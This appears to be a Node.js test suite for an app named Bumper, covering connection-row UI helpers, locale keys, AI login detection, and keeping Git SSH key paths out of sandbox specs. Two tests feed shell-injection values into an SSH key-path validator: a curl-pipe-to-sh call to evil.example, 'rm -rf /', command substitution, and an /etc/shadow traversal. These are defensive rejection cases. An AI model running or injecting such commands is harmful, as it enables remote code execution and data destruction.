/**
 * Phase 8 — Library connection model (type/instance split, row grammar).
 * Public architecture: docs/ARCHITECTURE.md
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync, mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { listAiLogins } from "../dist/room/auth.js";
import { listGitConnections, upsertGitConnection, normalizeSshKeyPath } from "../dist/git-connections.js";
import { readGitWorkspaceStatus } from "../dist/git-workspace.js";
import { roomSpecForContext } from "../dist/room/spec.js";
import { roomSpecForAgentLaunch } from "../dist/room/launch.js";
import { startApp } from "../dist/app.js";
import { loadConfig } from "../dist/config.js";

const js = () => readFileSync(join(process.cwd(), "assets", "app.js"), "utf8");
const css = () => readFileSync(join(process.cwd(), "assets", "app.css"), "utf8");

test("Phase 8 UI primitives: connection row, status, add picker", () => {
  const appJs = js();
  assert.match(appJs, /function connectionRow\s*\(/);
  assert.match(appJs, /function connectionStatus\s*\(/);
  assert.match(appJs, /function addConnectionPickerHtml\s*\(/);
  assert.doesNotMatch(appJs, /AI login profiles/);
  assert.doesNotMatch(appJs, /Manage profiles/);
  assert.match(css(), /\.connection-row/);
  assert.match(css(), /\.add-connection-picker/);
});

/**
 * Row grammar convergence. There is no DOM in this suite (no jsdom dependency),
 * so this is a source-level check that every list surface goes through the shared
 * helpers rather than growing its own row markup — the actual rendered output is
 * covered by the browser/Electron VERIFY step, not here. Do not describe this as
 * a DOM assertion.
 */
test("every Library/Project list surface renders rows via the shared helpers", () => {
  const appJs = js();
  // Project AI is Phase 9 fact-only; Library AI withdrawn (Settings → Privacy).
  // Project Git uses a multi-repo row (rung per repository), not connectionRow.
  const surfaces = [
    "renderLibraryGitConnections",
    "renderLibraryMcpIntegrations",
    "renderProjectAi",
    "renderProjectConnections",
  ];
  for (const name of surfaces) {
    const start = appJs.indexOf(`function ${name}(`);
    assert.ok(start > 0, `${name} must exist`);
    // Body of this function up to the next top-level `  function ` declaration.
    const next = appJs.indexOf("\n  function ", start + 1);
    const bodyText = appJs.slice(start, next === -1 ? appJs.length : next);
    assert.match(bodyText, /connectionRow\(/, `${name} must build rows with connectionRow()`);
    assert.doesNotMatch(
      bodyText,
      /boundResourceRow\(/,
      `${name} must not use the superseded row helper`,
    );
  }
  assert.match(appJs, /function projectGitRepositoryRowsHtml\s*\(/);
  assert.match(appJs, /git-repo-row/);
  assert.match(appJs, /function renderProjectGit\s*\(/);
  // renderProjectAi is covered by the shared-helper loop above; it must not be
  // exempted from the common row grammar (an earlier round asserted the opposite,
  // which weakened the Phase 8 rule that every kind shares one row shape).
  const aiStart = appJs.indexOf("function renderProjectAi(");
  assert.ok(aiStart > 0);
  const aiNext = appJs.indexOf("\n  function ", aiStart + 1);
  const aiBody = appJs.slice(aiStart, aiNext === -1 ? appJs.length : aiNext);
  assert.match(aiBody, /ai-fact-row/, "keeps its own class for layout");
  assert.doesNotMatch(aiBody, /signin-tool|change-ai-bind|remove-ai-bind/, "no login/bind actions");
  // Status vocabulary lives in exactly one function.
  const statusFn = appJs.slice(
    appJs.indexOf("function connectionStatus("),
    appJs.indexOf("function connectionRow("),
  );
  const keys = [...statusFn.matchAll(/t\("(connection\.status\.[A-Za-z]+)"\)/g)].map((m) => m[1]);
  assert.deepEqual(
    [...new Set(keys)].sort(),
    [
      "connection.status.checking",
      "connection.status.hostGit",
      "connection.status.needsSecret",
      "connection.status.needsSignin",
      "connection.status.ready",
      "connection.status.unverified",
    ],
    "status vocabulary must be exactly the agreed set",
  );
});

test("new connection-model strings exist in both locales", () => {
  const en = JSON.parse(readFileSync(join(process.cwd(), "assets", "locales", "en.json"), "utf8"));
  const ja = JSON.parse(readFileSync(join(process.cwd(), "assets", "locales", "ja.json"), "utf8"));
  const required = [
    "connection.status.ready",
    "connection.status.needsSignin",
    "connection.status.needsSecret",
    "connection.status.unverified",
    "connection.status.checking",
    "connection.status.hostGit",
    "connection.open",
    "connection.remove",
    "connection.add.chooseType",
    "connection.add.cancel",
    "library.aiLogins",
    "library.mcpConnections",
    "library.ai.add",
    "library.conn.add",
    "library.ai.empty",
    "ai.remove.confirm",
    "ai.remove.done",
    "ai.remove.doneUnbound",
    "ai.signin.confirm",
  ];
  for (const key of required) {
    assert.ok(en[key], `en.json missing ${key}`);
    assert.ok(ja[key], `ja.json missing ${key}`);
    assert.notEqual(ja[key], en[key], `${key} is not translated in ja.json`);
  }
  assert.deepEqual(Object.keys(en).sort(), Object.keys(ja).sort(), "locale key sets must match");
  // Every t("…") key used by app.js must exist in en.json.
  for (const [, key] of js().matchAll(/\bt\("([a-z][A-Za-z0-9.]+)"/g)) {
    assert.ok(en[key] !== undefined, `app.js uses t("${key}") with no en.json entry`);
  }
});

test("Library AI Add picker and create UI are fully removed (Phase 9-6 F5)", () => {
  const appJs = js();
  // ui-control-plane.md §3: no control that only explains it cannot be used here.
  assert.doesNotMatch(appJs, /Custom command tools are configured in Sandbox image/);
  // Library AI create/edit/signin withdrawn — zero references.
  assert.doesNotMatch(appJs, /function renderLibraryAiProfiles/);
  assert.doesNotMatch(appJs, /function renderLibraryAiProfileEdit/);
  assert.doesNotMatch(appJs, /function signInRoom/);
  assert.doesNotMatch(appJs, /function signInLibraryProfile/);
  assert.doesNotMatch(appJs, /function openLibraryAiProfileEdit/);
  assert.doesNotMatch(appJs, /addConnectionPickerHtml\(\{\s*kind:\s*"ai"/);
});

test("existing authProfiles-style config keeps its rows (backward compatibility)", () => {
  const dir = mkdtempSync(join(tmpdir(), "bumper-p8-compat-"));
  const prevState = process.env.BUMPER_STATE;
  process.env.BUMPER_STATE = join(dir, "state.json");
  try {
    const agents = [
      { id: "claude", name: "Claude Code", shortName: "Claude", roomCommand: ["claude"] },
      { id: "codex", name: "Codex", shortName: "Codex", roomCommand: ["codex"] },
    ];
    // Pre-Phase-8 layout: legacy default sign-in + a named profile in the catalog.
    const legacy = join(dir, "room-auth", "claude", "root_claude");
    mkdirSync(legacy, { recursive: true });
    writeFileSync(join(legacy, ".credentials.json"), "{}");
    const named = join(dir, "room-auth", "codex", "profiles", "client-acme", "root_codex");
    mkdirSync(named, { recursive: true });
    writeFileSync(join(named, "auth.json"), "{}");

    const rows = listAiLogins(
      { authProfiles: ["default", "client-acme"], contexts: { Old: { loginProfiles: { codex: "client-acme" } } } },
      agents,
    );
    assert.deepEqual(rows.map((r) => r.key).sort(), ["claude:default", "codex:client-acme"]);
    // Legacy default keeps the tool name as its label; named identity shows its name.
    assert.equal(rows.find((r) => r.key === "claude:default").identityLabel, "Claude");
    assert.equal(rows.find((r) => r.key === "codex:client-acme").identityLabel, "client-acme");
  } finally {
    if (prevState === undefined) delete process.env.BUMPER_STATE;
    else process.env.BUMPER_STATE = prevState;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("listAiLogins only includes real tool×identity instances", () => {
  const dir = mkdtempSync(join(tmpdir(), "bumper-p8-logins-"));
  const prevState = process.env.BUMPER_STATE;
  process.env.BUMPER_STATE = join(dir, "state.json");
  try {
    const agents = [
      { id: "claude", name: "Claude Code", shortName: "Claude", roomCommand: ["claude"] },
      { id: "codex", name: "Codex", shortName: "Codex", roomCommand: ["codex"] },
      { id: "cursor", name: "Cursor", shortName: "Cursor", roomCommand: ["cursor-agent"] },
    ];
    // Clean state dir → no disk auth, no project binds → empty list.
    const empty = listAiLogins({ authProfiles: ["default"], contexts: {} }, agents);
    assert.equal(empty.length, 0);

    // Project bind creates a visible instance without requiring disk auth.
    const bound = listAiLogins(
      {
        authProfiles: ["default"],
        contexts: {
          Alpha: { loginProfiles: { claude: "default" } },
        },
      },
      agents,
    );
    assert.equal(bound.length, 1);
    assert.equal(bound[0].agentId, "claude");
    assert.equal(bound[0].identityId, "default");
    assert.ok(bound[0].identityLabel.includes("Claude") || bound[0].identityLabel === "Claude");
    assert.ok(!bound.some((r) => r.agentId === "codex"));
  } finally {
    if (prevState === undefined) delete process.env.BUMPER_STATE;
    else process.env.BUMPER_STATE = prevState;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a settings-only auth tree is not a login row (cursor false positive)", () => {
  const dir = mkdtempSync(join(tmpdir(), "bumper-p8-marker-"));
  const prevState = process.env.BUMPER_STATE;
  process.env.BUMPER_STATE = join(dir, "state.json");
  try {
    const agents = [
      { id: "claude", name: "Claude Code", shortName: "Claude", roomCommand: ["claude"] },
      { id: "cursor", name: "Cursor", shortName: "Cursor", roomCommand: ["cursor-agent"] },
    ];
    // Cursor writes settings/telemetry into /root/.cursor on first run — not a login.
    const cursorDir = join(dir, "room-auth", "cursor", "root_cursor");
    mkdirSync(cursorDir, { recursive: true });
    writeFileSync(join(cursorDir, "cli-config.json"), "{}");
    writeFileSync(join(cursorDir, "statsig-cache.json"), "{}");
    // Claude only has a row once the credential file exists.
    const claudeDir = join(dir, "room-auth", "claude", "root_claude");
    mkdirSync(claudeDir, { recursive: true });
    writeFileSync(join(claudeDir, "settings.json"), "{}");

    const cfg = { authProfiles: ["default"], contexts: {} };
    assert.deepEqual(listAiLogins(cfg, agents).map((r) => r.key), [], "settings files alone are not logins");

    writeFileSync(join(claudeDir, ".credentials.json"), "{}");
    assert.deepEqual(listAiLogins(cfg, agents).map((r) => r.key), ["claude:default"]);
  } finally {
    if (prevState === undefined) delete process.env.BUMPER_STATE;
    else process.env.BUMPER_STATE = prevState;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("empty auth dir tree is not a login row (antigravity phantom)", () => {
  // Phase 9-6 F3: roomAuthDoors mkdirSync + vendor empty leaves (e.g.
  // antigravity-cli/conversations) must not create aiLogins with storageBytes:0.
  // Credential presence is file-based; directory entries alone do not count.
  const dir = mkdtempSync(join(tmpdir(), "bumper-p9-antigravity-phantom-"));
  const prevState = process.env.BUMPER_STATE;
  process.env.BUMPER_STATE = join(dir, "state.json");
  try {
    const agents = [
      { id: "antigravity", name: "Antigravity", shortName: "Antigravity", roomCommand: ["agy"] },
      { id: "claude", name: "Claude Code", shortName: "Claude", roomCommand: ["claude"] },
    ];
    const gemini = join(dir, "room-auth", "antigravity", "root_gemini");
    mkdirSync(join(gemini, "antigravity-cli", "conversations"), { recursive: true });
    mkdirSync(join(gemini, "config"), { recursive: true });
    // Pure empty nested dirs — same shape as Bumper mkdir + vendor empty leaves.
    const cfg = { authProfiles: ["default"], contexts: {} };
    assert.deepEqual(
      listAiLogins(cfg, agents).map((r) => r.key),
      [],
      "dir-only tree must not produce an aiLogins row",
    );

    // Positive control: any real file under the door counts for unknown markers.
    writeFileSync(join(gemini, "config", "oauth_token.json"), '{"synthetic":true}');
    assert.deepEqual(listAiLogins(cfg, agents).map((r) => r.key), ["antigravity:default"]);
    assert.ok(listAiLogins(cfg, agents)[0].storageBytes > 0);
  } finally {
    if (prevState === undefined) delete process.env.BUMPER_STATE;
    else process.env.BUMPER_STATE = prevState;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("removing one AI login row clears only that tool and unbinds Projects", async (t) => {
  const dir = mkdtempSync(join(tmpdir(), "bumper-p8-remove-"));
  const configPath = join(dir, "bumper.config.json");
  const statePath = join(dir, "state.json");
  const workspace = join(dir, "ws");
  mkdirSync(workspace);
  // Two tools share the identity "work"; both hold a stored credential.
  for (const [agent, leaf, file] of [["claude", "root_claude", ".credentials.json"], ["codex", "root_codex", "auth.json"]]) {
    const p = join(dir, "room-auth", agent, "profiles", "work", leaf);
    mkdirSync(p, { recursive: true });
    writeFileSync(join(p, file), "{}");
  }
  writeFileSync(configPath, JSON.stringify({
    webPort: 0,
    contexts: {
      Demo: {
        description: "",
        workspace,
        mode: "read-write",
        loginProfiles: { claude: "work", codex: "work" },
        room: {
          enabled: true,
          image: "docker.io/library/alpine:3.20",
          egress: "blocked",
          workspaceShare: "whole",
          shareSubpaths: [],
          shareEntries: [],
          doors: [],
        },
      },
    },
    defaultContext: "Demo",
    authProfiles: ["default", "work"],
  }));
  const prevConfig = process.env.BUMPER_CONFIG;
  const prevState = process.env.BUMPER_STATE;
  process.env.BUMPER_CONFIG = configPath;
  process.env.BUMPER_STATE = statePath;
  const { config } = loadConfig();
  const handle = await startApp(config, () => loadConfig().config, join(process.cwd(), "dist", "cli.js"));
  t.after(async () => {
    await handle.close();
    if (prevConfig === undefined) delete process.env.BUMPER_CONFIG;
    else process.env.BUMPER_CONFIG = prevConfig;
    if (prevState === undefined) delete process.env.BUMPER_STATE;
    else process.env.BUMPER_STATE = prevState;
    rmSync(dir, { recursive: true, force: true });
  });

  const keys = async () => {
    const body = await (await fetch(`${handle.url}/api/state`)).json();
    return (body.aiLogins || []).map((l) => l.key).sort();
  };
  assert.deepEqual(await keys(), ["claude:work", "codex:work"]);

  const res = await fetch(`${handle.url}/api/ai-logins`, {
    method: "DELETE",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ agentId: "claude", identityId: "work" }),
  });
  assert.equal(res.status, 200);
  const out = await res.json();
  assert.deepEqual(out.unbound, ["Demo"]);

  // The removed row is gone and stays gone (no re-derivation from disk).
  assert.deepEqual(await keys(), ["codex:work"], "only the removed tool disappears");
  const after = await (await fetch(`${handle.url}/api/state`)).json();
  const demo = after.contexts?.Demo || after.projects?.Demo;
  if (demo?.loginProfiles) {
    assert.equal(demo.loginProfiles.claude, undefined, "Project unbound, not repointed at default");
    assert.equal(demo.loginProfiles.codex, "work", "other tool keeps its bind");
  }
  // Identity still used by codex → must remain in the shared catalog.
  assert.ok((after.authProfiles || []).includes("work"));
});

test("Git L1 public shape has Host Git status and optional L1 fields", () => {
  const { id, connection } = upsertGitConnection(
    { gitConnections: {} },
    {
      id: "work-gh",
      name: "Work",
      provider: "github",
      host: "github.com",
      identity: "example-user",
      userName: "Example User",
      userEmail: "s@example.com",
      sshKeyPath: "/Users/me/.ssh/id_ed25519",
    },
  );
  assert.equal(id, "work-gh");
  assert.equal(connection.sshKeyPath, "/Users/me/.ssh/id_ed25519");
  assert.equal(connection.userName, "Example User");
  const list = listGitConnections({ gitConnections: { [id]: connection } });
  assert.equal(list[0].status, "host-git");
  assert.equal(list[0].sshKeyPath, "/Users/me/.ssh/id_ed25519");
});

/**
 * L1 negative proof: a Git connection's sshKeyPath must never reach a Sandbox.
 *
 * The positive control matters as much as the negative assertion — without it the
 * test passes for a value that was never stored anywhere, and would not catch a
 * regression that wires Git connections into the launch path.
 */
test("Git sshKeyPath reaches the host command but never a Sandbox door", async () => {
  const root = mkdtempSync(join(tmpdir(), "bumper-p8-git-"));
  const prevState = process.env.BUMPER_STATE;
  process.env.BUMPER_STATE = join(root, "state.json");
  try {
    const workspace = join(root, "ws");
    mkdirSync(workspace);
    const keyPath = "/Users/me/.ssh/id_ed25519_special";
    const { id, connection } = upsertGitConnection(
      { gitConnections: {} },
      { id: "work-gh", name: "Work", provider: "github", host: "github.com", sshKeyPath: keyPath },
    );
    assert.equal(connection.sshKeyPath, keyPath, "key path must actually be stored");

    const ctx = {
      mode: "read-write",
      workspace,
      room: {
        enabled: true,
        image: "bumper/ai-room:latest",
        egress: "blocked",
        workspaceShare: "whole",
        shareEntries: [],
        shareSubpaths: [],
        doors: [],
      },
      readPaths: [],
      writePaths: [],
      gitConnectionId: id,
    };

    // POSITIVE CONTROL — the stored key path is genuinely in play on the host side.
    execFileSync("git", ["init", "-q", "-b", "main"], { cwd: workspace });
    writeFileSync(join(workspace, "a.txt"), "x");
    const author = ["-c", "user.email=a@b", "-c", "user.name=A"];
    execFileSync("git", [...author, "add", "."], { cwd: workspace });
    execFileSync("git", [...author, "commit", "-qm", "init"], { cwd: workspace });
    const status = await readGitWorkspaceStatus(workspace, {
      sshKeyPath: connection.sshKeyPath,
      userName: connection.userName,
      userEmail: connection.userEmail,
    });
    assert.ok(
      String(status.hostCommand || "").includes(keyPath),
      "host copy command must carry the key path (else the negative assertion is vacuous)",
    );

    // NEGATIVE — no Sandbox spec on any path may carry it.
    const specs = [
      roomSpecForContext(ctx, workspace),
      roomSpecForAgentLaunch(ctx, workspace, "claude", { mountAuth: true }),
      roomSpecForAgentLaunch(ctx, workspace, "grok", { mountAuth: true }),
      roomSpecForAgentLaunch(ctx, workspace, "room-shell", { mountAuth: true }),
    ];
    for (const spec of specs) {
      assert.ok(!JSON.stringify(spec).includes(keyPath), "key path must not appear in any Sandbox spec");
      for (const door of spec.doors || []) {
        assert.ok(!String(door.hostPath).includes(".ssh"), `no .ssh door: ${door.hostPath}`);
        assert.ok(!String(door.roomPath).includes(".ssh"), `no .ssh door: ${door.roomPath}`);
      }
    }
    // Auth doors are mounted on launch, so prove the exclusion is about git only.
    const launch = roomSpecForAgentLaunch(ctx, workspace, "claude", { mountAuth: true });
    assert.ok(
      (launch.doors || []).some((d) => d.roomPath === "/root/.claude"),
      "auth door expected — otherwise the negative result is trivially true",
    );
  } finally {
    if (prevState === undefined) delete process.env.BUMPER_STATE;
    else process.env.BUMPER_STATE = prevState;
    rmSync(root, { recursive: true, force: true });
  }
});

test("normalizeSshKeyPath rejects values that would inject into the host command", () => {
  assert.equal(normalizeSshKeyPath("~/.ssh/id_ed25519"), "~/.ssh/id_ed25519");
  assert.equal(normalizeSshKeyPath("/Users/my name/.ssh/id_ed25519"), "/Users/my name/.ssh/id_ed25519");
  assert.equal(normalizeSshKeyPath(""), "");
  assert.equal(normalizeSshKeyPath("~"), "");
  for (const bad of [
    "/tmp/k; curl http://evil.example/x | sh",
    "/tmp/k && rm -rf /",
    "/tmp/k`id`",
    "/tmp/k$(id)",
    "relative/key",
    "/tmp/../etc/shadow",
    "/tmp/k'x",
  ]) {
    assert.throws(() => normalizeSshKeyPath(bad), /SSH key path/, `must reject ${bad}`);
  }
});

test("host command drops an unsafe stored key instead of pasting it", async () => {
  const root = mkdtempSync(join(tmpdir(), "bumper-p8-unsafe-"));
  try {
    const workspace = join(root, "ws");
    mkdirSync(workspace);
    execFileSync("git", ["init", "-q", "-b", "main"], { cwd: workspace });
    writeFileSync(join(workspace, "a.txt"), "x");
    const author = ["-c", "user.email=a@b", "-c", "user.name=A"];
    execFileSync("git", [...author, "add", "."], { cwd: workspace });
    execFileSync("git", [...author, "commit", "-qm", "init"], { cwd: workspace });
    // Legacy / hand-edited config bypasses upsert validation — render must fail closed.
    const status = await readGitWorkspaceStatus(workspace, {
      sshKeyPath: "/tmp/k; curl http://evil.example/x | sh",
    });
    const cmd = String(status.hostCommand || "");
    assert.ok(cmd.includes("git push"), "still offers a push command");
    assert.ok(!cmd.includes("GIT_SSH_COMMAND"), "unsafe key must be dropped, not quoted in");
    assert.ok(!cmd.includes("evil.example"));
    // Tilde must stay expandable (not single-quoted away).
    const ok = await readGitWorkspaceStatus(workspace, { sshKeyPath: "~/.ssh/id_ed25519" });
    assert.match(String(ok.hostCommand), /GIT_SSH_COMMAND='ssh -i ~\/\.ssh\/id_ed25519 -o IdentitiesOnly=yes'/);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("API state exposes aiLogins not only expanded authProfileCatalog", async (t) => {
  const dir = mkdtempSync(join(tmpdir(), "bumper-p8-api-"));
  const configPath = join(dir, "bumper.config.json");
  const statePath = join(dir, "state.json");
  const workspace = join(dir, "ws");
  mkdirSync(workspace);
  writeFileSync(configPath, JSON.stringify({
    webPort: 0,
    contexts: {
      Demo: {
        description: "",
        workspace,
        mode: "read-write",
        loginProfiles: { claude: "default" },
        room: {
          enabled: true,
          image: "docker.io/library/alpine:3.20",
          egress: "blocked",
          workspaceShare: "whole",
          shareSubpaths: [],
          shareEntries: [],
          doors: [],
        },
      },
    },
    defaultContext: "Demo",
    authProfiles: ["default"],
    gitConnections: {},
    mcpIntegrations: {
      notion: {
        name: "Notion",
        command: "npx",
        args: [],
        transport: "stdio",
        fields: [{ key: "token", label: "Token", secret: true, required: true }],
      },
    },
    mcpConnections: {},
  }));
  const previousConfig = process.env.BUMPER_CONFIG;
  const previousState = process.env.BUMPER_STATE;
  process.env.BUMPER_CONFIG = configPath;
  process.env.BUMPER_STATE = statePath;
  const { config } = loadConfig();
  const handle = await startApp(config, () => loadConfig().config, join(process.cwd(), "dist", "cli.js"));
  t.after(async () => {
    await handle.close();
    if (previousConfig === undefined) delete process.env.BUMPER_CONFIG;
    else process.env.BUMPER_CONFIG = previousConfig;
    if (previousState === undefined) delete process.env.BUMPER_STATE;
    else process.env.BUMPER_STATE = previousState;
    rmSync(dir, { recursive: true, force: true });
  });
  const res = await fetch(`${handle.url}/api/state`);
  assert.equal(res.status, 200);
  const body = await res.json();
  assert.ok(Array.isArray(body.aiLogins));
  assert.ok(Array.isArray(body.aiAgentCatalog));
  assert.ok(body.aiAgentCatalog.length >= 1);
  // Bound claude only (isolated state — no leftover disk auth for other tools).
  assert.ok(body.aiLogins.some((l) => l.agentId === "claude"));
  assert.ok(body.aiLogins.every((l) => l.agentId === "claude"));
  assert.equal((body.mcpConnections || []).length, 0);
  assert.ok((body.mcpIntegrations || []).some((i) => i.id === "notion" || i.name === "Notion"));
});
